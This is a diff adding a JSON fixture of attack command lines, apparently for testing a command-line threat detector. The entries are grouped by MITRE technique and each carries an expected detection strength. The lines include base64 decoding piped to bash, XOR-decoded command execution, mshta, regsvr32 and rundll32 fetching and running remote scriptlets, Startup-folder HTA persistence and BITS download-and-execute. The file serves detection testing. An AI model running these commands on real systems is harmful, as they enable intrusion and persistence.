+    "echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\""
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #6604d964 Base64 decoding with Perl",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\")",
+    "perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"",
+    "echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'",
+    "echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #b4f6a567 Base64 decoding with shell utilities",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)",
+    "printf $ENCODED | base64 -d",
+    "echo $ENCODED | base64 -d",
+    "echo $(echo $ENCODED) | base64 -d",
+    "echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded",
+    "echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded",
+    "echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d",
+    "echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d",
+    "bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\""
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "medium",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #b6097712 Base64 decoding with shell utilities (freebsd)",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | b64encode -r -)",
+    "printf $ENCODED | b64decode -r",
+    "echo $ENCODED | b64decode -r",
+    "echo $(echo $ENCODED) | b64decode -r",
+    "echo $ENCODED > /tmp/T1140.encoded && b64encode -r /tmp/T1140.encoded",
+    "echo $ENCODED > /tmp/T1140.encoded && b64decode -r < /tmp/T1140.encoded",
+    "echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | b64decode -r",
+    "echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | b64decode -r"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #18ee2002 FreeBSD b64encode Shebang in CLI",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh",
+    "echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh",
+    "echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh",
+    "echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh"
+   ],
+   "expected_min_strength": [
+    "medium",
+    "medium",
+    "medium",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1140 #005943f9 Hex decoding with shell utilities",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)",
+    "printf $ENCODED | xxd -r -p",
+    "echo $ENCODED | xxd -r -p",
+    "echo $(echo $ENCODED) | xxd -r -p",
+    "echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded",
+    "echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded",
+    "echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p",
+    "echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #3a15c372 Linux Base64 Encoded Shebang in CLI",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash",
+    "echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash",
+    "echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash",
+    "echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash"
+   ],
+   "expected_min_strength": [
+    "medium",
+    "medium",
+    "medium",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1140 #c3b65cd5 XOR decoding and command execution using Python",
+   "technique": "T1140",
+   "executor": "bash",
+   "lines": [
+    "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"AAkqKQEM\"; key = \"waEHleblxiQjoxFJQaIMLdHKz\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1140 #9f8b1c54 Expand CAB with expand.exe",
+   "technique": "T1140",
+   "executor": "command_prompt",
+   "lines": [
+    "mkdir \"%TEMP%\\art-expand-out\" >nul 2>&1",
+    "echo hello from atomic red team > \"PathToAtomicsFolder\\T1140\\src\\art-expand-source.txt\"",
+    "makecab \"PathToAtomicsFolder\\T1140\\src\\art-expand-source.txt\" \"%TEMP%\\art-expand-test.cab\"",
+    "pushd \"%TEMP%\\art-expand-out\"",
+    "expand \"%TEMP%\\art-expand-test.cab\" -F:* .",
+    "popd"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #1483fab9 Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
+   "technique": "T1218.005",
+   "executor": "command_prompt",
+   "lines": [
+    "mshta.exe javascript:a=(GetObject('script:https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.005 #906865c3 Mshta executes VBScript to execute malicious command",
+   "technique": "T1218.005",
+   "executor": "command_prompt",
+   "lines": [
+    "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.005 #c4b97eeb Mshta Executes Remote HTML Application (HTA)",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "$var =Invoke-WebRequest \"https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\" -UseBasicParsing",
+    "$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"",
+    "mshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"",
+    "start-sleep -s 15",
+    "stop-process -name \"calculator\" -Force -ErrorAction Ignore",
+    "stop-process -name \"CalculatorApp\" -Force -ErrorAction Ignore"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #007e5672 Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #58a193ec Invoke HTML Application - Jscript Engine Simulating Double Click",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #39ceed55 Invoke HTML Application - Direct download from URI",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "Invoke-ATHHTMLApplication -HTAUri https://www.example.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #e7e3a525 Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #d3eaaf6a Invoke HTML Application - JScript Engine with Inline Protocol Handler",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #b8a8bdb2 Invoke HTML Application - Simulate Lateral Movement over UNC Path",
+   "technique": "T1218.005",
+   "executor": "powershell",
+   "lines": [
+    "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.005 #8707a805 Mshta used to Execute PowerShell",
+   "technique": "T1218.005",
+   "executor": "command_prompt",
+   "lines": [
+    "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\""
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.010 #449aa403 Regsvr32 local COM scriptlet execution",
+   "technique": "T1218.010",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\system32\\regsvr32.exe /s /u /i:\"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\" scrobj.dll"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.010 #c9d0c4ef Regsvr32 remote COM scriptlet execution",
+   "technique": "T1218.010",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.010 #08ffca73 Regsvr32 local DLL execution",
+   "technique": "T1218.010",
+   "executor": "command_prompt",
+   "lines": [
+    "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll )"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.010 #1ae5ea1f Regsvr32 Registering Non DLL",
+   "technique": "T1218.010",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.010 #9d71c492 Regsvr32 Silent DLL Install Call DllRegisterServer",
+   "technique": "T1218.010",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\system32\\regsvr32.exe /s /i \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\""
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.011 #57ba4ce9 Rundll32 execute JavaScript Remote Payload With GetObject",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.011 #638730e7 Rundll32 execute VBscript command",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.011 #32d1cf1b Rundll32 execute VBscript command using Ordinal number",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1218.011 #d91cae26 Rundll32 advpack.dll Execution",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe advpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #5e46a58e Rundll32 ieadvpack.dll Execution",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe ieadvpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #41fa324a Rundll32 syssetup.dll Execution",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\""
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #71d771cd Rundll32 setupapi.dll Execution",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\""
+   ],
+   "expected_min_strength": [
+    "weak"
+   ]
+  },
+  {
+   "name": "T1218.011 #22cfde89 Execution of HTA and VBS Files using Rundll32 and URL.dll",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"",
+    "rundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""
+   ],
+   "expected_min_strength": [
+    "medium",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #9f5d081a Launches an executable using Rundll32 and pcwutl.dll",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #ae3a8605 Execution of non-dll using rundll32.exe",
+   "technique": "T1218.011",
+   "executor": "powershell",
+   "lines": [
+    "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.011 #9fd5a74b Rundll32 with Ordinal Value",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll\",#2"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #e4c04b6f Rundll32 with Control_RunDLL",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe shell32.dll,Control_RunDLL \"PathToAtomicsFolder\\T1047\\bin\\calc.dll\""
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #83a95136 Rundll32 with desk.cpl",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "copy %windir%\\System32\\calc.exe not_an_scr.scr",
+    "rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr"
+   ],
+   "expected_min_strength": [
+    "none",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #2d5029f0 Running DLL with .init extension and function",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe PathToAtomicsFolder\\T1218.011\\bin\\_WT.init,krnl"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1218.011 #f3ad3c5b Rundll32 execute command via FileProtocolHandler",
+   "technique": "T1218.011",
+   "executor": "command_prompt",
+   "lines": [
+    "rundll32.exe url.dll,FileProtocolHandler calc.exe"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1218.011 #8a7f56ee Rundll32 execute payload by calling RouteTheCall",
+   "technique": "T1218.011",
+   "executor": "powershell",
+   "lines": [
+    "rundll32.exe zipfldr.dll,RouteTheCall \"'%windir%\\System32\\calc.exe'\""
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1197 #3c73d728 Bitsadmin Download (cmd)",
+   "technique": "T1197",
+   "executor": "command_prompt",
+   "lines": [
+    "bitsadmin.exe /transfer /Download /priority Foreground https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1197 #f63b8bc4 Bitsadmin Download (PowerShell)",
+   "technique": "T1197",
+   "executor": "powershell",
+   "lines": [
+    "Start-BitsTransfer -Priority foreground -Source https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1197 #62a06ec5 Persist, Download, & Execute",
+   "technique": "T1197",
+   "executor": "command_prompt",
+   "lines": [
+    "bitsadmin.exe /create AtomicBITS",
+    "bitsadmin.exe /addfile AtomicBITS https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin3_flag.ps1",
+    "bitsadmin.exe /setnotifycmdline AtomicBITS C:\\Windows\\system32\\notepad.exe NULL",
+    "bitsadmin.exe /resume AtomicBITS",
+    "ping -n 5 127.0.0.1 >nul 2>&1",
+    "bitsadmin.exe /complete AtomicBITS"
+   ],
+   "expected_min_strength": [
+    "none",
+    "medium",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1197 #afb5e09e Bits download using desktopimgdownldr.exe (cmd)",
+   "technique": "T1197",
+   "executor": "command_prompt",
+   "lines": [
+    "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  }
+ ]
+}
